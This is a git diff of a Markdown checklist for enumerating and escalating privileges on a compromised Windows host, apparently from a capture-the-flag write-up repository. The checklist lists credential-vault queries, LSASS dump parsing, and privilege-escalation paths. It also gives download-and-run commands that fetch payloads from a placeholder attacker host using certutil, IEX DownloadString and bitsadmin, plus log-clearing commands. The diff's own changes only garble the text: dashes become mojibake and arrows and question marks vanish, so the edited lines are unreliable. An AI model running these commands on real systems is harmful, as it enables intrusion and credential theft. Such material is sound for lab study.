@@ -4,16 +4,16 @@ Used on: **Wreath**
 
 Wreath additions: `whoami /priv`, `whoami /groups`, `wmic service get name,displayname,pathname,startmode`, `sc qc <service>`, and `Get-Acl` were used to identify a writable unquoted service path.
 
-Checklist for enumerating a Windows host after landing a shell (Meterpreter / WinRM / RDP / SSH). Commands marked **[USED]** appeared in the writeups in this repo; the rest are the default playbook — run them if the targeted checks don't yield anything.
+Checklist for enumerating a Windows host after landing a shell (Meterpreter / WinRM / RDP / SSH). Commands marked **[USED]** appeared in the writeups in this repo; the rest are the default playbook â€” run them if the targeted checks don't yield anything.
 
 > The canonical one-shot automated tool is **winPEAS**. This note is the by-hand equivalent, split by goal so you can run individual checks when pushing a full PEAS binary is not an option.
 
 ---
 
-## 1. Where am I? System Context
+## 1. Where am I System Context
 
 ```powershell
-whoami                                  # [USED — Blueprint, Logging]
+whoami                                  # [USED â€” Blueprint, Logging]
 whoami /all                             # groups + privileges + SID
 whoami /groups
 whoami /priv
@@ -39,7 +39,7 @@ wmic os get caption,csname,version,buildnumber
 whoami /priv
 net user                                # local users
 net user <user>                         # details for one user
-net user <user> /domain                 # [USED — after AD pivot]
+net user <user> /domain                 # [USED â€” after AD pivot]
 net localgroup Administrators
 net localgroup "Remote Management Users"
 net group "Domain Admins" /domain
@@ -49,13 +49,13 @@ Red flags in `whoami /priv`:
 
 | Privilege | Significance |
 |-----------|-------------|
-| `SeImpersonatePrivilege` | Potato family (Juicy/Rogue/Print/God) ? SYSTEM |
+| `SeImpersonatePrivilege` | Potato family (Juicy/Rogue/Print/God)  SYSTEM |
 | `SeAssignPrimaryTokenPrivilege` | Same family |
 | `SeBackupPrivilege` | Read SAM / SYSTEM / security hives |
 | `SeRestorePrivilege` | Write over protected files |
 | `SeTakeOwnershipPrivilege` | Re-ACL system paths |
 | `SeDebugPrivilege` | Dump LSASS |
-| `SeLoadDriverPrivilege` | Kernel driver load ? PrivEsc |
+| `SeLoadDriverPrivilege` | Kernel driver load  PrivEsc |
 | `SeManageVolumePrivilege` | AlwaysInstallElevated-like chain |
 | `SeTrustedCredManAccessPrivilege` | Read saved creds |
 
@@ -64,7 +64,7 @@ Red flags in `whoami /priv`:
 ## 3. Domain Context
 
 ```powershell
-# Am I domain-joined?
+# Am I domain-joined
 (Get-WmiObject Win32_ComputerSystem).PartOfDomain
 (Get-WmiObject Win32_ComputerSystem).Domain
 
@@ -103,7 +103,7 @@ Get-ADUser -Filter 'DoesNotRequirePreAuth -eq $true'
 
 ```powershell
 # Saved creds (cmdkey)
-cmdkey /list                            # [USED — Overwatch]
+cmdkey /list                            # [USED â€” Overwatch]
 
 # Windows Credential Manager vault
 vaultcmd /listcreds:"Web Credentials"
@@ -161,7 +161,7 @@ Transfer `lsass.dmp` to the attacker and parse with `pypykatz lsa minidump lsass
 
 ```powershell
 # Scheduled tasks
-schtasks /query /fo LIST /v               # [USED — baseline]
+schtasks /query /fo LIST /v               # [USED â€” baseline]
 Get-ScheduledTask | Where-Object {$_.State -ne 'Disabled'} | Format-Table TaskName, TaskPath, State
 
 # Services with misconfigured paths / ACLs (classic PrivEsc)
@@ -185,7 +185,7 @@ Look for:
 ipconfig /all
 route print
 arp -a
-netstat -ano                              # [USED — when looking for loopback listeners]
+netstat -ano                              # [USED â€” when looking for loopback listeners]
 netstat -anob                             # binary owning each connection (needs admin)
 Get-NetTCPConnection | Where State -eq Listen
 ```
@@ -225,7 +225,7 @@ type %USERPROFILE%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\Conso
 ```
 
 ### Check for NSSM wrappers (Overwatch pivot)
-Look for `nssm.exe` in service PathName — NSSM wraps non-service binaries as Windows services, and the wrapped binary is often replaceable:
+Look for `nssm.exe` in service PathName â€” NSSM wraps non-service binaries as Windows services, and the wrapped binary is often replaceable:
 ```powershell
 Get-WmiObject win32_service | Where { $_.PathName -match 'nssm' }
 ```
@@ -269,13 +269,13 @@ Get-MpPreference | Select-Object -Property ExclusionPath, DisableRealtimeMonitor
 
 | Symptom | Check |
 |---------|-------|
-| `SeImpersonate` / `SeAssignPrimaryToken` | Potato family ? SYSTEM |
+| `SeImpersonate` / `SeAssignPrimaryToken` | Potato family  SYSTEM |
 | `cmdkey /list` shows entries | `runas /savecred /user:...` with saved creds |
 | Unquoted service path | binary plant in writeable ancestor |
 | Writeable service binary | overwrite + restart the service |
 | Scheduled task running as SYSTEM and writeable | plant payload |
 | `SeBackupPrivilege` or Admin | dump SAM / SECURITY hives (`reg save`) |
-| Domain-joined + user | BloodHound ? ACL path to DA |
+| Domain-joined + user | BloodHound  ACL path to DA |
 | `GenericWrite` on Computer / MSA | Shadow Credentials (see `shadow-credentials.md`) |
 | `SPN` set on user-type account | Kerberoast (`-m 13100`) |
 | `DONT_REQ_PREAUTH` on account | AS-REP Roast (`-m 18200`) |
@@ -286,7 +286,7 @@ Get-MpPreference | Select-Object -Property ExclusionPath, DisableRealtimeMonitor
 
 ```powershell
 # winPEAS
-certutil -urlcache -f http://<ATTACKER>/winPEAS.ps1 winPEAS.ps1   # [USED — Logging]
+certutil -urlcache -f http://<ATTACKER>/winPEAS.ps1 winPEAS.ps1   # [USED â€” Logging]
 .\winPEAS.ps1 > resultados.txt 2>&1
 
 # PowerUp (services / unquoted paths / reg ACLs)
@@ -309,7 +309,7 @@ SharpUp.exe audit
 
 ```powershell
 # certutil
-certutil -urlcache -f http://<ATTACKER>/file.exe C:\Windows\Temp\file.exe    # [USED — Logging, Blueprint]
+certutil -urlcache -f http://<ATTACKER>/file.exe C:\Windows\Temp\file.exe    # [USED â€” Logging, Blueprint]
 
 # PowerShell (IEX)
 iex (New-Object Net.WebClient).DownloadString('http://<ATTACKER>/script.ps1')
@@ -324,7 +324,7 @@ bitsadmin /transfer job http://<ATTACKER>/file.exe C:\Windows\Temp\file.exe
 copy \\<ATTACKER>\share\file.exe C:\Windows\Temp\file.exe
 
 # On the attacker
-sudo python3 -m http.server 80             # [USED — every Windows box]
+sudo python3 -m http.server 80             # [USED â€” every Windows box]
 sudo smbserver.py share $(pwd) -smb2support
 ```
 
@@ -343,7 +343,7 @@ del C:\Windows\Temp\shell.exe
 # wevtutil cl Application
 ```
 
-Avoid log clearing on HTB/THM boxes — it is not necessary and is loud / noisy for no reason.
+Avoid log clearing on HTB/THM boxes â€” it is not necessary and is loud / noisy for no reason.
 
 ---
 
